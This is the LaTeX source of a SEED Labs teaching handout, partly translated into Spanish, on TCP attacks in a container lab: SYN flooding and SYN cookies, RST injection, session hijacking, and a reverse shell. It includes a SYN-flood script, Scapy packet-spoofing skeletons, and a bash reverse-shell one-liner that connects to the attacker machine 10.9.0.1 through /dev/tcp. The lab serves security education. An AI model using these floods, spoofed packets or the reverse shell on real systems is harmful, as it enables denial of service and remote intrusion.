%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\newcommand{\commonfolder}{../../common-files}

\input{\commonfolder/header}
\input{\commonfolder/copyright}


\newcommand{\telnet} {\texttt{telnet}\xspace}
\newcommand{\tcpFigs}{./Figs}

\lhead{\bfseries SEED Labs -- Laboratorio de Ataques TCP/IP}

\begin{document}

\newcounter{task}
\setcounter{task}{1}
\newcommand{\mytask} {\bf {\noindent \arabic{task}} \addtocounter{task}{1} \,}



\begin{center}
{\LARGE Laboratorio de Ataques TCP/IP}
\end{center}

\seedlabcopyright{2018 - 2020}



% *******************************************
% SECTION
% ******************************************* 
\section{Descripción General}

El objetivo de este laboratorio es que el estudiante gane experiencia en vulnerabilidades como también en ataques contra esas vulnerabilidades. Los sabios aprenden de sus errores. En la educación de la seguridad informática, estudiamos errores que terminan siendo vulnerabilidades en el software. Estudiar los errores del pasado no sólo ayuda a los estudiantes a entender porque los sistemas son vulnerables, porque un descuido inofensivo en aparencia puede desembocar en un desastre, y porque son necesarios tantos mecanismos de seguridad. Sino que aún más importante ayuda a los estudiantes a entender los patrones comúnes en las vulnerabilidades y evitar cometer los errores del pasado en el futuro. Además usando esas vulnerabilidades como casos de estudio, los estudiantes pueden aprender los principios del diseño seguro, del desarrollo seguro y del testeo en la seguridad informática.

Las vulnerabilidades en los protolos TCP/IP representan un tipo de género especial dentro de los que son las vulnerabilidades en el diseño y la implementación de los protocolos; Nos muestran una lección fundamental y es que la seguridad debe ser concebida desde el momento en que se empieza a diseñar y no después. Por otra parte estudiar esas vulnerabilidades ayuda a los estudiantes a comprender los desafíos de la seguridad en las redes y porque son necesarias tantas métricas de seguridad en estas.
En este laboratorio los estudiantes llevarán a cabo varios Ataques contra el protocolo TCP.
Este laboratorio cubre los siguientes tópicos:

\begin{itemize}[noitemsep]
\item El protocolo TCP
\item Ataque de TCP SYN flood y las SYN cookies 
\item Ataque de TCP reset 
\item Ataque de TCP session hijacking
\item Shell Reversa
\item En un laboratorio aparte se cubre un tipo especial de ataque llamado El Ataque de Mitnick o Mitnick Attack
\end{itemize}


\paragraph{Lecturas y Videos.}
Para una cobertura más detallada sobre Ataques TCP puede consultar

\begin{itemize}
\item Capítulo 16 del libro de SEED, \seedbook
\item Sección 6 del curso de SEED en Udemy, \seedisvideo
\end{itemize}


\paragraph{Entorno de Laboratorio.} \seedenvironmentC



% *******************************************
% SECTION
% ******************************************* 
\section{Entorno de Laboratorio}

Para este laboratorio, necesitamos tener al menos tres máquinas. Usaremos contenedores para configurar el entorno del laboratorio. La Figura \ref{tcp:fig:labsetup} describe la configuración del entorno.
Usaremos el contenedor del atacante para atacar mientras que los tres contenedores restantes serán la máquina víctima y la de los usuarios.
Se asume que todas las máquinas están en la misma LAN.
Los estudiantes pueden optar por usar máquinas virtuales en vez de contenedores, aunque la última opción es más conveniente.


\begin{figure}[htb]
\begin{center}
\includegraphics[width=0.8\textwidth]{\commonfolder/Figs/OneLan.pdf}
\end{center}
\caption{Configuración del entorno}
\label{tcp:fig:labsetup}
\end{figure}
 

%\begin{lstlisting}[backgroundcolor=]
%  +------------+      +------------+  +------------+  +------------+
%  |  Attacker  |      |   Victim   |  |    User 1  |  |   User 2   |
%  |  10.9.0.1  |      |  10.9.0.5  |  |  10.9.0.6  |  |  10.9.0.7  |
%  +----+-------+      +------+-----+  +------+-----+  +------+-----+
%       |                     | eth0          | eth0          | eth0
%       |                     |               |               |
%-------+---------------------+---------------+---------------+-------
%           Network  10.9.0.0/24
%
%\end{lstlisting}
 

% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Setup del Contenedor y sus Comandos}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/container/setup}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

 
% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{El Contenedor del Atacante}

Para este laboratorio, podemos usar la Máquina Virtual o el Contenedor como la máquina del Atacante. Si hecha un vistazo al archivo de Docker Compose, verá que el contenedor del Atacante está configurado de manera diferente del resto de los contenedores. 

\begin{itemize}
\item \textit{Directorio Compartido.} Cuando usemos el contenedor del atacante para lanzar los ataques, necesitamos poner el código de ataque dentro del contenedor.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/container/volumes}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\item \textit{Modo Host.}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/container/host_mode}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\end{itemize}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%\input{\commonfolder/container_interface}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{La cuenta seed} 

Para este laboratorio, necesitamos hacer telnet de un contenedor a otro.
Hemos creado una cuenta llamada \texttt{seed} dentro de todos los contenedores.
El password de la misma es \texttt{dees}. Puede usar esta cuenta para telnet.



% *******************************************
% SECTION
% *******************************************
\section{Tarea 1: Ataque de SYN Flooding}


\begin{figure}[htb]
  \begin{center}
    \includegraphics[width=0.9\textwidth]{\tcpFigs/TCP_SYN_Flooding.pdf}
  \end{center}
  \caption{Ataque SYN Flooding}
  \label{tcp:fig:synflooding}
\end{figure}
 

El SYN Flood es ataque del tipo DoS, en el cual el atacante envía muchos requests SYN hacia un puerto TCP de la máquina víctima, pero el atacante no tiene la intención de completar el proceso del 3-way handshake. Los atacantes pueden usar una dirección IP spoofeada o optar por descontinuar el proceso.
A través de este ataque, los atacantes pueden floodear la cola de las half-opened connections (es decir las conexiones que no han terminado de completar el proceso 3-way handshake y han logrado llegar hasta el SYN, SYN-ACK pero no dieron el ACK final) en la máquina de víctima, cuando esta cola se llena la víctima no puede recibir más conexiones. La Figura \ref{tcp:fig:synflooding} muestra este ataque.

El tamaño de la cola es establecido a través de una configuración global del sistema. En los sistemas Ubuntu, podemos chequear esta configuración usando el siguiente comando. El Sistema Operativo establece este valor basado en el total de memoria que el sistema tiene: mientras más memoria, este valor es más grande.

\begin{lstlisting}
# sysctl net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
\end{lstlisting}

Podemos usar el comando \texttt{"netstat -nat"} para chequear el uso que se está haciendo de esa cola, es decir el número de half-opened conections asociadas a un puerto que está a la escucha.
El estado de estas conexiones es \texttt {SYN-RECV}. Si se completa el 3-way handshake, el estado de las conexiones será {\tt ESTABLISHED}.


\paragraph{SYN Cookie como Contramedida:}
Por defecto Ubuntu tiene una contramedida activada para protegerse del SYN Flooding. Esta protección es llamada SYN cookie, esta entrará en juego si detecta que el sistema está siendo atacado por un ataque del tipo SYN Flooding.
en nuestro contenedor servidor de la víctima, hemos desactivado esta contramedida (puede ver la entrada \texttt{sysctls} en el archivo \texttt{docker-compose.yml}).
Para activarla o desactivarla podemos usar el comando \texttt{sysctl}:

\begin{lstlisting}
# sysctl -a | grep syncookies     (Display the SYN cookie flag) 
# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
# sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
\end{lstlisting}

Para poder usar \texttt{sysctl} para cambiar los valores globales de las variables del sistema dentro del contenedor, el contenedor necesita estar configurado con la entrada \texttt{"privileged: true"} (en nuestro caso el contenedor víctima).
Sin esta configuración, si corremos el comando anteriormente mencionado veremos el siguiente mensaje de error. El contenedor no ttiene los privilegios para realizar este cambio.

\begin{lstlisting}
# sysctl -w net.ipv4.tcp_syncookies=1
sysctl: setting key "net.ipv4.tcp_syncookies": Read-only file system
\end{lstlisting}





% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Tarea 1.1: Lanzando el ataque usando Python}

Hemos provisto un programa de Python llamado \texttt{synflood.py}, pero
intencionalmente hemos omitido algunos datos esenciales en el código.
Este código envía paquetes TCP SYN spoofeadoos, con una dirección IP de origen, el puerto destino y el número de secuencia, generados de forma aleatoria.
Los estudiantes deberán de completar y terminar el código y usarlo para lanzar el ataque en la máquina víctima.


\begin{lstlisting}
#!/bin/env python3
  
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="*.*.*.*")
tcp = TCP(dport=**, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # source iP
    pkt[TCP].sport = getrandbits(16)     # source port
    pkt[TCP].seq   = getrandbits(32)     # sequence number
    send(pkt, verbose = 0)
\end{lstlisting}

Deje que el ataque se ejecute durante al menos un minuto, luego intente hacer telnet en la máquina de la víctima y vea si puede tener éxito. Es muy probable que
su ataque falle. Esto se debe a que múltiples problemas pueden contribuir al fracaso. del ataque. A continuación se enumeran las posibles causas de estos fallos y como abordarlas.

\begin{itemize}
  \item \textbf{Problema de Cache TCP:} Vea la Nota A más abajo

  \item \textbf{Problema de VirtualBox:} Si está realizando el ataque desde una Máquina Virtual contra otra en vez de usar los contenedores, por favor vea la Nota B más abajo. Esto no ocurre si se hace el ataque usando los contenedores.

  \item \textbf{Problema de retransmisión TCP:} 
  Después de enviar un paquete SYN+ACK, la máquina víctima esperará por el paquete ACK. Si este no llega a tiempo, TCP retransmitirá el paquete SYN+ACK. 
  La cantidad de veces que TCP retransmitirá este paquete, dependerá de los siguientes parámetross en el kernel (por defecto su valor es de 5)
    
\begin{lstlisting}
# sysctl net.ipv4.tcp_synack_retries
net.ipv4.tcp_synack_retries = 5
\end{lstlisting}
	
	Después de realizar 5 retransmisiones, TCP borrará el item correspondiente de la cola half-open connection. Cada vez que un item es boorrado, un nuevo slot se abre. Esto provocará que sus paquetes de ataque y otros paquetes legítimos "luchen" en cierta forma por entrar en este nuevo slot que se liberó. Puede ocurrir que nuestro programa Python no sea lo suficiente rápido y que gane un paquete legítimo en vez del que estamos usando para atacar. Para ganar esta carrera, podemos correr varias instancias en paralelo del programa de ataque en Python. Por favor intente esta estrategia y vea si puede lograr un ataque exitoso.¿Cuántas instancias fueron necesarias para lograr un ataque exitoso?
stances 

  \item \textbf{El tamaño de la cola:}  
  	La cantidad de conexiones que pueden ser guardadas en la cola de  half-open connections pueden afectar al exito del ataque. El tamaño de la cola puede ser ajustado usando el siguiente comando:

\begin{lstlisting}
# sysctl -w net.ipv4.tcp_max_syn_backlog=80
\end{lstlisting}
     
     Mientras que el ataque este en curso, puede correr uno de los siguientes comandos en el contenedor de la víctima para monitorear cuantos items están en la cola. Cabe notar que un cuarto del espacio en la cola está reservado para ``destinos probados'' (Vea la Nota A) por lo tanto si ponemos un tamaño de 80 su capacidad actual es alrededor de 60.
     
\begin{lstlisting}
$ netstat -tna | grep SYN_RECV | wc -l
$ ss -n state syn-recv sport = :23 | wc -l
\end{lstlisting}

	Por favor reduzca el tamaño de la cola de the half-open connection en la máquina víctima y vea si puede mejorar el éxito de su ataque.
\end{itemize}

\paragraph{Nota A: Mecanismo de mitigación del Kernel.} 
En Ubuntu 20.04, si una Máquina X nunca se ha conectado a la máquina víctima, cuando se lance el ataque de SYN Flooding la Máquina X no podrá hacer telnet en la máquina víctima. Sin embargo, si antes del ataque, la Máquina X ha hecho un telnet (o una conexión TCP) a la máquina víctima, entonces X pareciera ser ``immune'' al ataque de SYN Flooding y podrá conectarse por telnet en la máquina víctima. Pareciera que la máquina víctima recuerda las conexiones exitosas que fueron hechas por la Máquina X en el pasado y usa esta especie de memoria cuando establece futuras conexiones con este cliente. Este tipo de comportamiento no existe en Ubuntu 16.04 y anteriores.

Esto es debidoo a una mitigación del kernel:
TCP reserva una cuarta parte de la cola de trabajos pendientes para ``destinos probados'' si las SYN Cookies están desactivadas. Después de realizar una conexión TCP de \texttt{10.9.0.6} hacia el servidor \texttt{10.9.0.5}, podemos ver que la dirección IP \texttt{10.9.0.6} es recordada (cacheada) por el servidor, por lo que usarán los slots reservados cuando las conexiones provienen de ellos, y por lo tanto no serán afectados por el ataque de SYN Flooding.
Para eliminar los efectos de esta mitigación, podemos ejecutar el comando \texttt{"ip tcp\ _metrics flush"} en el servidor.

\begin{lstlisting}
# ip tcp_metrics show
10.9.0.6 age 140.552sec cwnd 10 rtt 79us rttvar 40us source 10.9.0.5

# ip tcp_metrics flush
\end{lstlisting}


\paragraph{Nota B: Paquetes RST.} 
Si está realizando esta Tarea usando dos Máquinas Virtuales es decir lanzando los ataques de una Máquina Virtual a otra, en lugar de usar los contenedores, notará en Wireshark la presencia de paquetes RST (reset). Inicialmente pensamos que estos paquetes eran generados por el recipiente del paquete SYN+ACK, pero en realidad son generados por el servidor NAT en nuestra configuración.
If you are doing this task using two VMs, i.e., launching the attack from one VM
against another VM, instead of attacking a container, from the Wireshark,
you will notice many RST packets (reset). Initially, we thought that 
the packets were generated from the recipient of the SYN+ACK packet, 
but it turns out they are generated by the 
NAT server in our setup. 

El tráfico saliente de la Máquina Virtual en nuestro laboratorio pasará por un servidor NAT provisto por VirtualBox. Para TCP, NAT se encarga de crear las llamadas entradas de address traslation que están basadas en paquetes SYN.
En nuestro ataque, los paquetes SYN que generados por el atacante no pasan por el NAT (tanto el atacante como la víctima están detrás del servidor NAT), por lo tanto estas entradas no son creadas. Cuando la vícttima envía un paquete SYN+ACK a la dirección IP de origen (que es generada de forma aleatoria por el atacante), este paquete irá a través de NAT, pero NAT no sabe que hacer dado que no hay una entrada previa para esta conexión TCP por lo tanto terminará enviando un paquete TCP RST a la víctima.

Los paquetes RST hacen que la víctima borre datos de la cola de half-open connection. Entonces mientras nosotros como atacantes tratamos de saturar esta cola con el ataque, VirtualBox ayuda a la víctima a borrar todos los registros de nuestros paquetes de la cola. Convirtiéndose así en una competencia entre nuestro código y VirtualBox.



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Tarea 1.2: Lanzando el ataque usando C} 

Exceptuando el problema de la cache TCP, el resto de los inconvenientes mencionados en la Tarea 1.1 pueden ser resuletos si podemos enviar paquetes SYN spoofeados de forma rápida. Podemos lograrlo usando C. Hemos provisto un programa hecho en C llamado \texttt{synflood.c} este archivo se encuentra dentro del directorio del laboratorioo. Por favor compile el programa en la Máquina Virtual y lance el ataque en la máquina vícttima.

\begin{lstlisting}
// Compile the code on the host VM
$ gcc -o synflood synflood.c

// Launch the attack from the attacker container
# synflood 10.9.0.5 23
\end{lstlisting}

Antes de lanzar el ataque, por favor restaure el tamaño de la cola a su tamaño original. Por favor compare los resultados de este ataque con los que ha hecho usando el programa de Python y explique las diferencias entre ambos programas de ataque.  


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Tarea 1.3: Activar la Contramedida de SYN Cookie}

Por favor active la protección SYN cookie, corra sus ataques nuevamente y compare los resultados. 


% *******************************************
% SECTION
% *******************************************
\section {Tarea 2: Ataque TCP RST en Conexiones \texttt{telnet}}

The TCP RST Attack can terminate an established TCP connection between
two victims. For example, if there is an established \telnet connection (TCP)
between two users A and B, attackers can spoof a RST packet from A to B,
breaking this existing connection. To succeed in this attack, attackers
need to correctly construct the TCP RST packet. 

In this task, you need to launch a TCP RST attack from the VM 
to break an existing \telnet connection between A and B, which are 
containers.  To simplify the lab,
we assume that the attacker and the victim are on the same LAN,
i.e., the attacker can observe the TCP traffic between
A and B.


\paragraph{Lanzando el ataque manualmente.} 
Please use Scapy to conduct the TCP RST attack. 
A skeleton code is provided in the following. You need to replace each
\texttt{@@@@} with an actual value (you can get them using Wireshark):  


\begin{lstlisting}
#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
\end{lstlisting}

\paragraph{Opcional: Lanzando el ataque automáticamente.} 
Students are encouraged to write a program to launch the 
attack automatically using the sniffing-and-spoofing technique. 
Unlike the manual approach, we get all the parameters
from sniffed packets, so the entire attack is automated.  
Please make sure that when you 
use Scapy's \texttt{sniff} function, don't forget to 
set the \texttt{iface} argument.  

 

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{comment}
% We comment out  this task, because it does not work any more.
% It seems that the video streaming client will reconnect to the server
% if the connection is broken. We haven't figured out a solution yet.
%
% My fugure plan:
%    I would like to use container to host our own streeming service.
%    Then we can launch the RST attack on the server. 
%    

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection {Tarea 3: Ataques TCP RST en Aplicaciones Streaming de Video}

Let us make the TCP RST attack more interesting by experimenting it on 
the applications that are widely used in nowadays.
We choose the video streaming application in 
this task. For this task, you can choose a video streaming web site that you 
are familiar with (we will not name any specific web site here).  Most of
video sharing websites establish a TCP connection with the client for 
streaming the video content. The attacker's goal is to disrupt the TCP session 
established between the victim and video streaming machine. To 
simplify the lab, we assume that the attacker and the victim are on the 
same LAN. In the following, we describe the common interaction between
a user (the victim) and some video-streaming web site:

\begin{itemize}
\item The victim browses for a video content in the video-streaming web 
site, and selects one of the videos for streaming. 

\item Normally video contents are hosted by a different machine,
where all the video contents are located. After the victim selects 
a video, a TCP session will be established between the victim 
machine and the content server for the video streaming.
The victim can then view the video he/she has selected.
\end{itemize}

Your task is to disrupt the video streaming by breaking the 
TCP connection between the victim and the content server.
You can let the victim user browse the video-streaming 
site from another (virtual) machine or from the same (virtual) machine
as the attacker. Please be noted that, to avoid liability issues,
any attacking packets should be targeted 
at the victim machine (which is the machine run by yourself), 
not at the content server machine (which does not belong to you).

\end{comment}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

            


% *******************************************
% SECTION
% *******************************************
\section{Tarea 3: TCP Session Hijacking}



\begin{figure}[htb]
  \begin{center}
    \includegraphics[width=0.8\textwidth]{\tcpFigs/TCP_Session_Hijacking.pdf}
  \end{center}
  \caption{TCP Session Hijacking Attack}
  \label{tcp:fig:hijacking}
\end{figure}
 
   
The objective of the TCP Session Hijacking attack is to hijack an 
existing TCP connection (session) between two victims by injecting malicious contents
into this session. If this connection is a \telnet session, attackers
can inject malicious commands (e.g. deleting an important file) 
into this session, causing the victims 
to execute the malicious commands. 
Figure~\ref{tcp:fig:hijacking} depicts how the attack works.
In this task, you need to demonstrate how you can hijack a 
\texttt{telnet} session between two computers. Your goal is to get the
\texttt{telnet} server to run a malicious command from you.
For the simplicity of the task, we assume that 
the attacker and the victim are on the same LAN.


\paragraph{Launching the attack manually.}
Please use Scapy to conduct the TCP Session Hijacking attack.
A skeleton code is provided in the following. You need to replace each
\texttt{@@@@} with an actual value; you can use Wireshark to figure out what value you 
should put into each field of the spoofed TCP packets. 


\begin{lstlisting}
#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
data = "@@@@"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
\end{lstlisting}


\paragraph{Optional: Launching the attack automatically.}
Students are encouraged to write a program to launch the
attack automatically using the sniffing-and-spoofing technique.
Unlike the manual approach, we get all the parameters
from sniffed packets, so the entire attack is automated.
Please make sure that when you
use Scapy's \texttt{sniff} function, don't forget to
set the \texttt{iface} argument.





% *******************************************
% SECTION
% *******************************************
\section{Tarea 4: Crear una Shell Reversa usando TCP Session Hijacking}

When attackers are able to inject a command to the victim's machine using
TCP session hijacking, they are not interested in running one simple
command on the victim machine; they are interested in running many
commands. Obviously, running these commands all through TCP session
hijacking is inconvenient. What attackers want to achieve is to use the
attack to set up a back door, so they can use this
back door to conveniently conduct further damages.

A typical way to set up back doors is to run a reverse shell from the
victim machine to give the attack the shell access to the victim machine.
Reverse shell is a shell process running on a remote machine, connecting
back to the attacker's machine. This gives an attacker a convenient way to
access a remote machine once it has been compromised. 


In the following, we will show how we can set up a reverse shell if we can
directly run a command on the victim machine (i.e. the server machine). 
In the TCP session hijacking attack, attackers cannot directly run a
command on the victim machine, so their jobs is to run a reverse-shell
command through the session hijacking attack. 
In this task, students need to demonstrate that they can achieve this goal.


To have a \texttt{bash} shell on a remote machine connect back to the attacker's machine, the
attacker needs a process waiting for some connection on a given port. In this example, we will
use \texttt{netcat}. This program allows us to specify a port
number and can listen for a connection on that port.
In the following demo, we show two windows, each one is from a 
different machine. The top window is the attack machine \texttt{10.9.0.1},  
which runs \texttt{netcat}~(\texttt{nc} for short), listening on port \texttt{9090}. 
The bottom window is the victim machine \texttt{10.9.0.5}, and 
we type the reverse shell command.
As soon as the reverse shell gets executed, the top window indicates 
that we get a shell. This is a reverse shell, i.e., it runs on \texttt{10.9.0.5}.  

\begin{minipage}{\linewidth}
\begin{lstlisting}[backgroundcolor=]
           +---------------------------------------------------+ 
           | (*@\textbf{On 10.9.0.1 (attcker)}@*)                             |
           |                                                   | 
           | $ nc -lnv 9090                                    |  
           | Listening on 0.0.0.0 9090                         |  
           | Connection received on 10.9.0.5 49382             |  
           | $   <--+ (*@\textbf{This shell runs on 10.9.0.5}@*)              | 
           |                                                   |  
           +---------------------------------------------------+  
          
           +---------------------------------------------------+  
           | (*@\textbf{On 10.9.0.5 (victim)}@*)                              |
           |                                                   | 
           |$ /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1  | 
           |                                                   | 
           +---------------------------------------------------+
\end{lstlisting}
\end{minipage}

We provide a brief description on the reverse shell command in the following.
Detailed explanation can be found in the SEED book.

\begin{itemize}
\item \texttt{"/bin/bash -i"}: \texttt{i} stands for interactive, meaning that the shell must be
  interactive (must provide a shell prompt)

\item \texttt{"> /dev/tcp/10.9.0.1/9090"}: This causes the output (\texttt{stdout}) of the shell
  to be redirected to the tcp connection to \texttt{10.9.0.1}'s port \texttt{9090}.
  The output \texttt{stdout} is represented by file descriptor number~1.

\item \texttt{"0<\&1"}: File descriptor 0 represents the standard input (\texttt{stdin}). This causes
  the  \texttt{stdin} for the shell to be obtained from the tcp connection.

\item \texttt{"2>\&1"}: File descriptor 2 represents standard error \texttt{stderr}. This
  causes the error output to be redirected to the tcp connection.
\end{itemize}

In summary, \texttt{"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<\&1 2>\&1"} starts a
\texttt{bash} shell, with its input coming from a tcp connection, and its standard
and error outputs being
redirected to the same tcp connection. 

In the demo shown above, when the \texttt{bash}
shell command is executed on \texttt{10.9.0.5}, it connects back to the \texttt{netcat} process
started on \texttt{10.9.0.1}. This is confirmed via the \texttt{"Connection received on 10.9.0.5"}
message displayed by \texttt{netcat}.


The description above shows how you can set up a reverse shell if you have
the access to the target machine, which is the \texttt{telnet} server in
our setup, but in this task, you do not have such an access. Your task is 
to launch an TCP session hijacking attack on an existing \texttt{telnet}
session between a user and the target server. You need to inject your
malicious command into the hijacked session, so you can get a reverse
shell on the target server. 




% *******************************************
% SECTION
% ******************************************* 
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/submission}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% *******************************************
% SECTION
% *******************************************
\section{Agradecimientos}

\input{\commonfolder/acknowledgments}


\end{document}
